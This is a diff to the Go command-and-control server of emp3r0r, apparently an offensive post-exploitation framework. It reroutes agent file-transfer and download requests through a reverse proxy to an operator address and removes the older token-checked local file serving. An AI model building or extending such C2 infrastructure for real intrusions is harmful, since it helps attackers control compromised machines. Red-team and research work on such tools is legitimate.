@@ -4,16 +4,15 @@ import (
 	"encoding/base64"
 	"fmt"
 	"net/http"
-	"path/filepath"
+	"net/http/httputil"
+	"net/url"
 
 	"github.com/gorilla/mux"
-	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
-	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
-	"github.com/jm33-m0/emp3r0r/core/lib/util"
+	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 )
 
 // apiDispatcher routes requests to the correct handler.
@@ -53,35 +52,27 @@ func apiDispatcher(wrt http.ResponseWriter, req *http.Request) {
 	logging.Debugf("Got a request: api=%s, token=%s, agent_uuid=%s, sig=%x",
 		vars["api"], vars["token"], agent_uuid, agent_sig)
 
-	token := vars["token"]
+	// forward to operator
 	api := transport.WebRoot + "/" + vars["api"]
+	req_url := fmt.Sprintf("http://%s:1025/%s", netutil.WgOperatorIP, req.URL.Path)
+	parsedURL, err := url.Parse(req_url)
+	if err != nil {
+		logging.Errorf("handleFTPTransfer: %v", err)
+		http.Error(wrt, "Internal server error", http.StatusInternalServerError)
+		return
+	}
+	proxy := httputil.NewSingleHostReverseProxy(parsedURL)
+
+	// handlers
 	switch api {
 	case transport.CheckInAPI:
 		handleAgentCheckIn(wrt, req)
 	case transport.MsgAPI:
 		handleMessageTunnel(wrt, req)
 	case transport.FTPAPI:
-		for _, sh := range network.FTPStreams {
-			if token == sh.Token {
-				handleFTPTransfer(sh, wrt, req)
-				return
-			}
-		}
-		wrt.WriteHeader(http.StatusNotFound)
+		proxy.ServeHTTP(wrt, req)
 	case transport.FileAPI:
-		if !agents.IsAgentExistByTag(token) {
-			wrt.WriteHeader(http.StatusNotFound)
-			return
-		}
-		path := filepath.Clean(req.URL.Query().Get("file_to_download"))
-		path = filepath.Base(path)
-		logging.Debugf("FileAPI request for file: %s, URL: %s", path, req.URL)
-		local_path := fmt.Sprintf("%s/%s/%s", live.Temp, transport.WWW, path)
-		if !util.IsExist(local_path) {
-			wrt.WriteHeader(http.StatusNotFound)
-			return
-		}
-		http.ServeFile(wrt, req, local_path)
+		proxy.ServeHTTP(wrt, req)
 	case transport.ProxyAPI:
 		handlePortForwarding(network.ProxyStream, wrt, req)
 	default:
